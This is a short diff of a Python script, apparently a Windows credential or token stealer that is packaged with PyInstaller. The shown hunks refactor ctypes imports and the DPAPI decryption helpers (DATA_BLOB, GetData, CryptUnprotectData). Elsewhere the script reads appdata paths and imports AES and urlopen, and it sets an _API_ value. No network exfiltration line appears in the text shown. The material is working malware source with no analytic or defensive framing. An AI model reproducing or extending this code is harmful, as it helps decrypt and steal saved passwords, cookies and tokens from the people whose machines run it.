@@ -3,6 +3,7 @@
 # Comandos: pyinstaller --onefile --clean --i NONE simple.py 
 
 import threading,sys,os,re,ctypes
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from win32crypt import CryptUnprotectData
 from urllib.request import Request, urlopen
 from tempfile import mkdtemp
@@ -12,10 +13,10 @@ from Crypto.Cipher import AES
 from pystyleclean import *
 
 class DATA_BLOB(Structure):
-    _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
+    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]
 
 tempfolder = mkdtemp()
-_API_ = ""
+_API_ = "uwu"
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
 temp = os.getenv("TEMP")
@@ -34,14 +35,14 @@ def ipe():
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
-    buffer = ctypes.c_buffer(cbData)
-    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
-    buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
     blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
     blob_out = DATA_BLOB()
